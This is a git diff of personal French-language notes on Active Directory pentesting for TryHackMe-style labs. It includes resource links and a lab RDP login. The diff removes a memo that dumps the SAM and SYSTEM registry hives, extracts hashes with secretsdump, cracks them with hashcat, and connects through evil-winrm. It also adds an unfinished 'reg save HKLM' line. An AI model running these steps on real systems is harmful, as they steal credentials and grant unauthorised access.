@@ -23,6 +23,11 @@ https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html
 [thehacker.recipes](https://www.thehacker.recipes/)
 [ad cheatsheet - tools](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
 
+## Windows
+
+```powershell
+reg save HKLM
+
 ## Réseau
 
 https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address
@@ -95,43 +100,6 @@ xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
 ```
 
 ![](./thm_rdp.png)
-
-## Memo
-
-### Victim AD
-
-```powershell
-#administrator
-reg save HKLM\sam ./sam.save
-reg save HKLM\system ./system.save
-```
-
-### Offline
-
-```bash
-#hashes.txt
-impacket-secretsdump -sam sam.save -system system.save LOCAL
-```
-
-```bash
-# interactive mode - cracking wordlist based on victim info
-cupp -i
-```
-
-```bash
-hashcat -m 1000 hashes.txt wordlist.txt
-```
-
-### Shell
-
-```bash
-evil-winrm -i <ip> -u <account> -p <password>
-```
-
-```bash
-#remote desktop protocol
-xfreerdp /v:<ip> /u:<account> /p:<password>
-```
 
 ## Lab AD
 
